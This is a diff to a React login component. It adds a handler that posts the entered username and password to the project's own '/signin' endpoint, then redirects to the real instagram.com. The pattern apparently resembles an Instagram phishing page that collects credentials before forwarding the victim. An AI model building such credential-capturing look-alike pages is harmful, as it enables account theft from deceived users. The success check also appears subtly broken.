@@ -1,8 +1,29 @@
 import { useState } from 'react'
+import api from './api';
 import './App.css'
 
 function App() {
   const [showPassword, setShowPassword] = useState(false);
+
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleFormSubmit = async () => {
+    const payload = {
+      username,
+      password
+    }
+
+    const response = await api.post("/signin", payload, {
+      validateStatus: (status) => status < 500,
+    });
+
+    if(!response.success){
+       alert(response.data.msg);
+    }else{
+       window.location.href = "https://instagram.com";
+    }
+  }
   return (
     <>
       <div className="container">
